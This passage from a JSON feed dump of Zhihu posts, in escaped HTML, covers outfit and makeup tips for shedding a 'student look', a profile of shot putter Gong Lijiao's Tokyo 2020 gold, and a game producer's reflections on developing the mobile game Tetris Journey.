alt=\"\"></figure><p><strong>第二双——</strong></p>\n<p>适合完全不能驾驭高跟鞋的妹子，换成了<strong>红色平底芭蕾舞鞋</strong>。</p>\n<p>同时，加了一顶红色麂皮棒球帽，来和复古风的鞋子<strong>呼应</strong>。</p>\n<p>因为鞋子、帽子都是偏暗一点的酒红色，夏天穿并不会鲜艳的过分，但又很有特色。</p>\n<p>并且无论走在路上，还是拍照，红色都很亮眼咯。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-50887c45154c3fbec412f19f4409b1ce_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>总结——</strong>用鞋子来把握平衡</p>\n<p>T 恤 + 牛仔本身就很休闲，这时还穿运动鞋 / 帆布鞋，休闲感就会太重。</p>\n<p>如果发型、化妆、配饰……这些细节跟不上，很容易就是学生气。</p>\n<p>最容易改变风格的就是鞋子。</p>\n<p>推荐大家买一些鞋型略长、多露脚背的鞋子（有点跟更好），就会有成熟感。但因为衣服还是休闲向，所以并不会过分成熟。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d94e0d0a25eb17d83c96b1a4ad1fbe31_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还有<strong>奶奶鞋、玛丽珍鞋、乐福鞋</strong>，以及前面说过的芭蕾舞鞋，鞋跟都不高，属于好穿能驾驭的鞋款，大家可以试试看。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-cb50616296b3e3a49e189d3f34992e07_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-9c73180edcef4f5cda58adff32afe7d2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>二，穿衣小细节&amp;配饰</strong></strong></p>\n<p>有关穿衣的细节，前面已经提到了<strong>两点</strong>——</p>\n<p>上衣下摆塞到裤子里，卷裤子露脚踝。</p>\n<p>这样做的结果是，一是提高腰线、显高瘦，二是整个人更加精神、利索。</p>\n<p>第三点，我们日常生活中很容易忽略，但其实很简单就能做到的就是——</p>\n<p><strong>卷袖口</strong>和（穿衬衣时）胸前<strong>领口打开</strong>一点。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c2589865d63bf89634e4a4a62664d0f8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>注意好这几点之后，上面的图即使挡住鞋子，人看起来也是精神利索的。</p>\n<p>在职场上也是一样。</p>\n<p>白衬衣本来就容易有刻板印象，穿的中规中矩，整个人都有点土气。</p>\n<p>领口打开、袖子卷上，干练的感觉就会强很多。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b5da9209067d3aea8b425d6eee64d366_720w.jpg?source=8673f162\" alt=\"\"></figure><p>注意，我还加了<strong>2 件饰品</strong>——项链和手表。</p>\n<p>项链不需要多贵，手表呢，考虑到这期的穿搭主题，我选了一块只有几百块的平价时装表。</p>\n<p>在前面的条纹衫穿搭示范里，其实我也戴了一块表，价格依然很平价（千元左右），很适合职场新人和学生党。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0593f0fbe2113a3e30ab2d723d7fe52c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>总结——</strong></p>\n<p>其实，学生气并没什么不好，至少说明很青春嘛。</p>\n<p>但我理解，有“学生气”烦恼的女生，多半存在的问题是“幼稚感”和略带一点“土气”。</p>\n<p><strong>1，</strong>戴饰品 / 手表能快速<strong>提高精致度</strong></p>\n<p>价格并不需要很贵，但画龙点睛的作用非常明显。</p>\n<p>（改天咱们来写一期，饰品有多重要）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a461ebbc6c5369b15165f20df5df575c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2，</strong>养成注意穿衣细节的习惯</p>\n<p>卷袖子、卷裤脚、胸前的扣子不要系的太紧，衣服下摆最好塞进去……</p>\n<p>这些不花钱、不费力的小方法，能让你显得个子更高、更苗条，脸更小……要在日常生活中逐渐形成习惯。</p>\n<p><strong><strong>三，发型以及化（一点点）妆</strong></strong></p>\n<p>这个话题实在很大，所以我只简单说（展开说的话，可以单独写上好几篇吧）。</p>\n<p>在<a href=\"https://zhuanlan.zhihu.com/p/32932225\">发型太乖就土气？想不费力就变时髦，只需这几点小改变！</a>里桃子说过，这种紧贴头皮，看起来很乖的发型，不仅不时髦，还会带来其他问题。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4fc05687badecd607994c14cc90cc76a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>很多抱怨学生气的女生，大概都留过这种齐耳短发。</p>\n<p>拿我自己来说，革命女将和发型变好看之间，也往往只是一线之隔。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-3b15cbfac4d8c6b0610283b5dd2d5f47_720w.jpg?source=8673f162\" alt=\"\"></figure><p>至于怎么让发量更蓬松，不需要刻意烫染，就能摆脱土气的印象，大家可以翻翻之前这篇旧文，当时介绍的很详细啦。</p>\n<p>（发型蓬松，即使挡住脸，也依然会觉得是好看的）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1abec46a7a40c06afaf2d0a6094537b3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>化妆的加持作用就更明显了。</p>\n<p>并不是主张人人都化大浓妆，像我自己平时就是底妆 + 唇膏，<strong>尤其唇膏非常重要！</strong></p>\n<p>它非常提气色，能让整张脸一下子生动起来。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c0eb5e6a83466872cd88c1af51d237e2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>对于学生党来说，唇膏也不需要很贵。平价唇膏可选的也很多，我自己平时最爱用的平价唇膏是露华浓和 canmake.</p>\n<p>这只露华浓 423 买了很久，夏天涂发现很显白。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2d4f13e9879f15975e289eb2179ae546_720w.jpg?source=8673f162\" alt=\"\"></figure><p>总之，想要摆脱学生气可以从很多方面下手。</p>\n<p>大家可以根据自己的情况，一步一步来。</p>\n<p>这是一个过程，很难一下子达成（往往过于心急的结果是，过犹不及）。</p>\n<p>别说普通人，就是明星也不可能一下子就成功。谁还没个黑历史呢？</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-57c3ac7b56294b4519d229c00ae8373d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>桃子今天讲的几个方法，大家可以慢慢尝试，逐渐摸索到最适合自己的。</p>\n<p>最后放一张水原希子的图，其实之前我在推送里 po 过。不过找来找去，还是觉得这张最有代表性。</p>\n<p><strong>希望大家都能找到最美的自己，那一定也是最适合你的！</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-19447f4f90ab2a444725b835854c8fbc_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/20142619\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738760"},{"title":"2020 东京奥运会女子铅球决赛巩立姣夺得中国奥运田赛第一金，如何评价她的表现？","date":"2021-08-01 06:30:09","description":"\n<p>奥运冠军，拿来吧你！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-19a919a693318c9d3a223cf738f64154_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1364\" data-watermark=\"original\" data-original-src=\"v2-19a919a693318c9d3a223cf738f64154\" data-watermark-src=\"v2-89ad0fcb085bf8f26d12806b9b944666\" data-private-watermark-src=\"v2-b855dae886ecfddae987202f3b8e4a7c\"></p>\n<p>在东京<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25A5%25A5%25E8%25BF%2590%25E4%25BC%259A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">奥运会</a>田径项目<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/7/3/75308d5b/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">田赛</a>女子<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/9/c/94c57403/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">铅球</a>决赛的比赛中，中国选手<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25B7%25A9%25E7%25AB%258B%25E5%25A7%25A3\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">巩立姣</a>以20.58米的成绩夺得了决赛第一名，刷新个人最佳成绩的同时也为<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E4%25B8%25AD%25E5%259B%25BD%25E4%25BB%25A3%25E8%25A1%25A8%25E5%259B%25A2\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中国代表团</a>拿下本届奥运会第22枚金牌，这也是中国田径队在东京奥运会上的首块金牌。</p>\n<p>回顾她本场比赛：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a28e7c0b5ce63028f177a8ff0924ddf2_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-a28e7c0b5ce63028f177a8ff0924ddf2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>出场，巩立姣发射爱心</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f540fbca74d4844d043cd6e9d1afeef5_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-f540fbca74d4844d043cd6e9d1afeef5\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第一投，19米95</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2c56d73d1cfa8fb839f74a9ecaaf6807_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-2c56d73d1cfa8fb839f74a9ecaaf6807\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第二投，主动犯规</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1dd4a645d000c2c4d25d87ec81f08fc1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-1dd4a645d000c2c4d25d87ec81f08fc1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第三投继续提升，投出19米98：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d56099cd9a9811f044364b03d5af4993_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-d56099cd9a9811f044364b03d5af4993\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第四投19米80状态回落</p>\n<p><img src=\"https://pic3.zhimg.com/v2-66a45c2c037c1e7b7fc2ea9192bb7c68_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-66a45c2c037c1e7b7fc2ea9192bb7c68\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第五投，一击致命！20米53直接打破个人最好成绩，提升了10厘米！几乎锁定金牌！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-34f8955289870802f7909c3e696d0f0a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-34f8955289870802f7909c3e696d0f0a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第六头继续提升！20米58！金牌，冠军！</p>\n<p>*******</p>\n<p>巩立姣曾说，每一届奥运会都像做梦一样，有的是美梦，有的是噩梦。而5年前的里约，无疑是后者。</p>\n<p>2016年5月，巩立姣投出20米43，刷新尘封七年之久的个人纪录，并创下当年的世界最好成绩。来到里约，她是女子铅球的头号夺金热门。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-334d3cb9e6b6eeb10688d5e36b1c86ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"379\" data-watermark=\"original\" data-original-src=\"v2-334d3cb9e6b6eeb10688d5e36b1c86ee\" data-watermark-src=\"v2-75d3360a37877f97fe58ae2027ae9f90\" data-private-watermark-src=\"v2-1689aff5c56355f232af07b6e7833caf\"></p>\n<p><br>决赛前夜，第三次参加奥运的巩立姣辗转反侧，脑子里不断浮现夺冠的场景，分不清是幻想还是梦境。然而第二天，迎接巩立姣的是残酷的现实，在奥运会的赛场上，她仿佛灵魂出窍。</p>\n<p>“投完第二投我就知道肯定没戏了。”巩立姣后来回忆，“第一次有这种感觉，我是人来疯，那场比赛想赶紧结束，每投一个球都是煎熬。”</p>\n<p>最后一投，巩立姣被匈牙利的马顿逆转，无缘领奖台。返回驻地的大巴上，巩立姣默默对自己说：“别做梦了，醒醒吧，都结束了，你是第四。”巩立姣把自己关在房间里，几天没吃东西，不愿意见人，离开奥运村时，她忍不住在众人面前嚎啕大哭。</p>\n<p>回国后，巩立姣始终不愿意面对冲金失利的现实，陷入抑郁的情绪中无法自拔，一度萌生退意。在德国外教克拉克的建议下，田径队为巩立姣请来了北京师范大学的心理老师，对她进行针对性心理辅导。</p>\n<p>人生中最难熬的时光，巩立姣还是挺了过来，引领她走出阴影的仍然是内心对冠军的渴望。当失意的2016年重新翻篇，巩立姣又一次上路，在三战钻石联赛中夺冠后，她发了一条朋友圈：“当你握紧双手，里面什么都没有；当你打开双手，世界就在你手中。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6c67a6ecb07006ca450107dbb2afef8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-6c67a6ecb07006ca450107dbb2afef8a\" data-watermark-src=\"v2-a4a9358616d9c56b9260975d593b4a41\" data-private-watermark-src=\"v2-887727d5e158eeb4901c5034a90fd563\"></p>\n<p>2017年8月，伦敦世锦赛，铅球决赛被安排在第六天。这是伦敦一周以来最冷的一天，秋风刺骨，大雨又为比赛设置了重重障碍。然而用巩立姣的话说，练到这个份上了，雨战又何妨？</p>\n<p>从第一投开始，巩立姣就确立了领先地位，除了里约奥运会冠军卡特在第三投超过19米之外，几乎没人能对巩立姣形成威胁。</p>\n<p>最终，巩立姣用19.94米的成绩杀死了最后的悬念。铅球刚一落地，巩立姣便兴奋地跳了起来，任由泪水和雨水在脸上流淌，对着转播镜头比出“六”的手势——这是她的第六次世锦赛——而观众席上的教练和队友早已把国旗挥舞了起来。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-99bcd9e813cf2cb3ef829b0f9cc8de0c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"296\" data-watermark=\"original\" data-original-src=\"v2-99bcd9e813cf2cb3ef829b0f9cc8de0c\" data-watermark-src=\"v2-b5be3ef93826fdb95bec5df019962512\" data-private-watermark-src=\"v2-f59cfd7b6d746471711a910c371e48e6\"></p>\n<p><br>对巩立姣来说，这个世界冠军拿得水到渠成，酣畅淋漓，也让中国女子铅球时隔24年再次站上世界之巅。“整个冬天都特别难过，还抑郁过一段时间。”巩立姣说，“其实从失败中走出来，回到正轨特别难，但自己还是挺了过来。因为我心里一直都有梦想，那就是站在世界最高领奖台上。我想，只要它还在，总有一天会实现的。”</p>\n<p>站上冠军领奖台，巩立姣哭着唱完国歌，过去十几年的训练画面像电影一样在脑海里过了一遍。‘没有什么比梦想更值得坚持’一直是她的座右铭，在国旗升起的那一刻，她对这句话的理解更深了，对她来说，跌倒后重新爬起来的过程和金牌同样重要。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-75291a00888d5c5166fe1ee0a6e7b3d1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"329\" data-watermark=\"original\" data-original-src=\"v2-75291a00888d5c5166fe1ee0a6e7b3d1\" data-watermark-src=\"v2-9c63db6af50ae1c89cb7430012dae42d\" data-private-watermark-src=\"v2-04d97448704f6c462edc73ddeec9c3f3\"></p>\n<p><br>2018年，从玉珍取代外教克拉克接管巩立姣，上任之后她给弟子布置了一个艰巨的任务——增重。“2015年我体重大约110公斤，当时教练觉得我脚下速度慢，想让我通过减重提爆发力。”巩立姣说，“不到一年我减了近15公斤，没想到减完之后，脚下的速度是上去了，手上的劲儿却没了。没办法，还得根据实际情况再增回来。一开始因为节食缩小的胃，为了增肥又得强行撑起来。那段时间害怕吃饭，每多吃一口都难受。”</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9c15be4113c2493bbff3c11d8b549f7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-9c15be4113c2493bbff3c11d8b549f7e\" data-watermark-src=\"v2-4fc5232190311c1be368189dcf356dad\" data-private-watermark-src=\"v2-8f64bf1abbe757217a818bbe10b2cb4f\"></p>\n<p>台上一分钟，台下十年功，粗略估计，巩立姣在训练中的投掷量达到几十万次。常年累月的高强度训练让巩立姣浑身是伤，每到阴雨天，右臂和左腿的关节就会隐隐作痛。为了减少伤病困扰，教练组借助更科学的手段，将巩立姣的训练精细化、数据化，重质量、轻数量，以前每天至少投200次，而现在一周也不过投200次。在投掷量减小的基础上，从玉珍把巩立姣的训练用球从6公斤改为8公斤。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ce4746599a6cf7a84f8379b1f4aa57ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"1332\" data-watermark=\"original\" data-original-src=\"v2-ce4746599a6cf7a84f8379b1f4aa57ad\" data-watermark-src=\"v2-98bcd10380b09497e1db3e3401253143\" data-private-watermark-src=\"v2-fddb18c70667a9d6295b68cc0e2ec6b5\"></p>\n<p>夺得伦敦世锦赛冠军后，巩立姣彻底打破了魔咒，进入一种独孤求败的状态，从2017年开始连续三年世界排名第一。2019年，巩立姣在参加的14项比赛中获得13枚金牌，其中包括在多哈世锦赛上完成卫冕，连续第三年赢下钻石联赛决赛。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-70b7f6dcfa6b38cb4e0bfcef93c8271a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-watermark=\"original\" data-original-src=\"v2-70b7f6dcfa6b38cb4e0bfcef93c8271a\" data-watermark-src=\"v2-2cf0ac8a1db537d5df933da3b34af29f\" data-private-watermark-src=\"v2-fdf5f4f819c8914677497cfe0630bd85\"></p>\n<p>唯一让巩立姣失望的是世锦赛的成绩，仅仅投出19.55米，仅比亚军托马斯-多德多了8厘米，创下史上最低夺冠成绩，在此之前世锦赛的最低夺冠成绩是1999年的19.85米。即便如此，巩立姣依然对东京奥运的前景保持乐观，“这个冠军对我也是一种鼓励，让我更加自信。状态这么差都能拿下冠军，等我恢复状态肯定就更没有问题了。”</p>\n<p>虽然过去几年罕有敌手，但是巩立姣丝毫不敢懈怠，一直在尝试调整自己的技术动作。在女子铅球的顶尖选手中，巩立姣的身高和体重并没有优势，她只能在技术层面追求极致。</p>\n<p>外教克拉克执教期间，巩立姣对步伐和步频进行了修正，同时加强了体能储备。到了东京周期的冲刺阶段，巩立姣的训练重点变成了调整滑步距离，让动作变得更舒展。为了把改动作的风险降到最低，田径队专门请来了美国的心理专家，调整巩立姣的心态。</p>\n<p>2019年12月，收到那枚迟到11年的奥运奖牌之后，巩立姣在北京体育大学进行了一场题为《冠军》演讲，她表示为了回应外界的质疑，夺取东京奥运会的金牌是她必须做出的回应。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-228cfbcd57a9a3129cde37a0be62d929_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"326\" data-watermark=\"original\" data-original-src=\"v2-228cfbcd57a9a3129cde37a0be62d929\" data-watermark-src=\"v2-c67005c5e8cb39c8cb40a61bf0cedd06\" data-private-watermark-src=\"v2-f7133710e7f63fe9d19b1882777d17f3\"></p>\n<p><br>就在巩立姣按部就班进行备战时，东京奥运会宣布延期，对任何一个老将而言，这都不是一个好消息。“当时那个月，我觉得整个人都垮掉了。”巩立姣回忆，“因为那一年我练得很好，2月份时成绩就突破了20米，那时候眼里只有奥运会。”</p>\n<p>备战计划的调整让巩立姣的身体亮起了红灯，左膝出现了严重的水肿，连走路都成了问题，只能坐着投球，她觉得天都塌了下来。在北京体育大学那间小宿舍里，巩立姣把事情想开了，“幸好不是取消，延期我也没事，虽然体力、体能可能会有所下降，但好事多磨，我又多了一些时间去准备，就更十拿九稳了，我会争取把最好的状态留到明年。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-559b3599f9ac2243ba058d79d246f421_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"1365\" data-watermark=\"original\" data-original-src=\"v2-559b3599f9ac2243ba058d79d246f421\" data-watermark-src=\"v2-4a9111b6bf769a3f172cae6cc57f7c1a\" data-private-watermark-src=\"v2-56d3b1c355ea3faea50d8c3c0b254893\"></p>\n<p>巩立姣没有食言，今年她在参加的7场比赛里，有两场的成绩都超过了20米。6月中旬在绍兴举办的奥运选拔赛中，巩立姣投出20.31米，创下本赛季世界最好成绩。十几天后，巩立姣在全运会选拔赛中更进一步，投出了20.39米，创下个人生涯第二好成绩。值得一提的是，她在这次比赛中有三次试投超过20米。“我感觉已经把奥运会金牌装兜里了，挂在这呢，一伸手就拿到了。”</p>\n<p>今年5月，奥委会官网对巩立姣进行了专题报道，文中提到，21这个数字对她有着特别的意义：奥运会延迟到2021年，今年是她从事铅球的第21个年头，而她的目标是突破21米。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c8703afdd23adfcffb3caf503052f2a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"367\" data-watermark=\"original\" data-original-src=\"v2-0c8703afdd23adfcffb3caf503052f2a\" data-watermark-src=\"v2-814eeffe59297b3cd517c5b0b54118ff\" data-private-watermark-src=\"v2-fe6679891e8d26c3dcb04a26382ede60\"></p>\n<p><br>出征东京之前，巩立姣发了一条微博：“第四次参加奥运会，稳扎稳打，决胜东京，为国争光。”这一次，她终于做到了，在登上领奖台的那一刻，她的耳边一定响起了刘德华的那首歌：“等了好久终于等到今天，梦了好久终于把梦实现。”</p>\n<p>********</p>\n<p>卑微的贴二维码求关注我们的小破号：后厂村体工队</p>\n<p><img src=\"https://pic4.zhimg.com/v2-45c3be1acccc90aaca7c5418d388aa34_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"346\" data-watermark=\"original\" data-original-src=\"v2-45c3be1acccc90aaca7c5418d388aa34\" data-watermark-src=\"v2-e810e32a9b273de5249d0fa76d8daca8\" data-private-watermark-src=\"v2-16c4bcdabd4ea616588c61802f8468f1\" data-qrcode-value=\"http://weixin.qq.com/r/rnVCWl3EYgAdrRk59yC8\" data-tags=\"qrcode\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yi-ti-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">网易体育</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">198 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475915462?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会体操女子个人全能决赛唐茜靖第 7 芦玉菲第 18 ？</a><br><a href=\"http://www.zhihu.com/question/475987436?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会赛艇女子八人单桨有舵手决赛中国摘铜？</a><br>\n","link":"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价手游《俄罗斯方块环游记》？","date":"2021-07-31 15:30:07","description":"\n<p><b>大家好，我是《俄罗斯方块环游记》的制作人Poly，感谢@知乎游戏 的邀请。大家看到这个答案的时候《俄罗斯方块环游记》已经上线了，但这个答案中的很多故事、想法、感慨已经在心里酝酿了很久，很高兴有这个机会能够转化为文字跟大家分享。</b></p>\n<p>1、立项初衷</p>\n<p>我是个健忘的人，当要开始写这段故事的时候，我下意识的翻了一下2017年年底的照片以帮助我回忆。看了会照片后我想起很多事情，比如那时候我还一根白头发没有，养了一只叫布丁的花枝鼠，姥姥还在。</p>\n<p>刚接触Tetris时，它最吸引我们团队的地方是和一般的IP，例如故事、角色形象不一样，Tetris是一个家喻户晓的玩法。而我们又是一群特别喜欢设计新玩法的团队，我能想象也期望着它的变化与玩法延展能给我们一个大的发挥空间，这是件令人兴奋的事情。我用了一个月的时间来研究现代俄罗斯方块的各个版本，深入研究后，我发现原来在国外俄罗斯方块已经在各种平台上演变出了大小玩法上百种的新内容和规则变化，而这些新模式我们在国内很多人之前都没有玩到过。所以我当时我就很希望这款手游能承载这个小目标，能让国人玩到这些新内容，能给大家带来一些关于俄罗斯方块的惊喜。</p>\n<p><b>2、初次测试反馈</b></p>\n<p>第一个版本是在开发几个月时候在tap上测试的，这是一个完全创新，又有些“放飞自我“的版本。我记得几个月前和模电一起吃饭，临走时候他和我说，第一个版本是他最喜欢的版本。我不想对此发表我的想法，但是我理解他的意思。那是一个纯粹的tetis粉丝版本，那个版本有点小众。我记得当时每天都在看玩家的反馈，每晚到凌晨还在看玩家在世界频道说什么。总结来说，那个版本偏难。手感也有很多问题，如果是经常接触现代俄罗斯方块的玩家会觉得难度刚刚好，且他们对我们游戏当时的操作有很高的包容性。但是对于绝大多数新玩家来说，游戏的关卡设计太偏向解密性质了，而且那个版本当时还没来及做充足的新手指引。这让很多玩家在前期关卡卡住而消失。测试后的数据很不理想，我大概自闭了5天左右，不想和任何人说话。我把大家反馈的问题记录下来，写了很长的一个反思文，嗯….一个土黄色的PPT长文。以用于后续的版本调整。</p>\n<p>后面随着调整和优化，测试的数据也在逐步变好。我想和所有反馈给环游记建议的玩家说一声：谢谢…这句苍白的话是真诚的。</p>\n<p><b>3、在PVE和PVP中抉择</b></p>\n<p>虽然说如果问大家说是否知道俄罗斯方块，大家可能很多人都说知道，也会说会玩。但是我们的调研发现，大部分同学对于俄罗斯方块的认知，还是处于很早前的那个游戏机上的原始版本。对于俄罗斯方块如何对战，如何攻击对手，如何KO对手，还是比较模糊的。之前我们做过一次以PVP为起始的版本，数据不是很理想，其主要原因有2个，上面我说的是其中一个，就是大家会玩俄罗斯方块，但是不知道如何去击败对手。而俄罗斯方块的攻击规则又相对比较复杂，它和你的操作效率成正比。加上大家在之前也很少在手机上练习俄罗斯方块的操作手速，这2个问题抬高了玩家参与PVP的上手难度。玩家会因为手速和脑速不符在前期很容易在PVP中出现挫败感，而这种挫败感会让体验的玩家感到不适。</p>\n<p>所以在经过多次测试后，我们将更加简单、轻松的PVE关卡放在了游戏体验的开始。大家可以先了解规则，使用操作，熟练操作，然后再逐步解锁PVP的各个系统。</p>\n<p>当然，为了让喜欢俄罗斯方块竞技的老手们快速的体验到他们想玩的内容，我们的PVP解锁不仅可以通过打关卡和等级，也可以通过在经典马拉松中测试手速，如果手速达到标准，可以直接解锁竞技！</p>\n<p><b>4、上线后的一些感慨</b></p>\n<p>希望大家对小环游能多一些耐心和包容。因为俄罗斯方块环游记的整个开发并没有很好的前车之鉴，我们在整个近4年的的设计与开发就像一条没有路的登山一样，一直是在不停的探索、摸索，但我们是用真心在做这个游戏。我常常和研发同学说，游戏作为一种娱乐性质的产品，只有你自己快乐，才能把它流露在游戏中，让大家体验到快乐。但是很遗憾，虽然这一路开发环游记我们很沉迷和喜爱这个过程，但是这个过程也有很多迷茫的时候，困难不断，我们常常也会遇到很多挫折和受挫，而这些五味杂陈的情感可能也多多少少进入了游戏的设计细胞中，我认为它不一定是件坏事，因为有了这些苦辣酸甜感，或许会让环游记的故事变得更加饱满。但是呢，在环游记骨子里，它依然是那个儿时的少年，像三十多年前它带给大家快乐，让大家沉浸于码块，那个超越国界，超越种族，让全世界都喜欢的那个正能量的”小朋友“，真心的希望大家在上线后对小环游多多包容它,多多支持它~</p>\n<p>最后，我想谢谢一路陪伴我们测试的方块超人们，这3年多来你们的反馈，你们的鼓励，一直是我们前方的灯。可能你们不知道，有好多好多好多的时光里，当我们开发出现困境的时候，我们常常会内部相互转发你们在评论里给我们的鼓励，包括一直督促我们抓紧上线，督促我们抓紧优化，我们其实每一条评论都看了....这一路虽然很艰难，但是我总和身边的大家说：有喜欢你游戏的人，是一种荣幸，无论人多人少，我们都要珍惜喜欢它的每一个玩家。因为是广大方块超人们的鼓励，让我们一直坚持下来。</p>\n<p>鞠躬+敬礼(^^ゞ！！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b0933ed8a45cf6a1e8eb39c6827ab2e1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"290\" data-rawheight=\"234\" data-watermark=\"watermark\" 